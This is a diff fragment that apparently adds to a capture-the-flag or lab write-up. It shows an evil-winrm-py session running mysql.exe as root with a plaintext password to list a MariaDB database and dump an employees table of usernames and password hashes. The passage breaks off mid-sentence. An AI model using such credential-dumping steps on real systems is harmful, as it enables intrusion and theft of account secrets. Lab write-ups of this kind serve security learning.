@@ -439,6 +439,21 @@ sys
 Ill dump the databases
 
 ```python
-
+evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -D 'new_employees' -e "SHOW TABLES;"
+Tables_in_new_employees
+employees
 ```
 
+There is an employees table in this DB
+
+```python
+evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -D 'new_empl
+oyees' -e "SELECT * FROM employees;"
+id	username	password
+1	aaron.pierce	d482a055616317f569cd1ab90325479e
+2	nathan.reed	d482a055616317f569cd1ab90325479e
+4	adam.brooks	f3a4f28a0aaf388c0ce16a6011acf511
+evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin>
+```
+
+Found some 
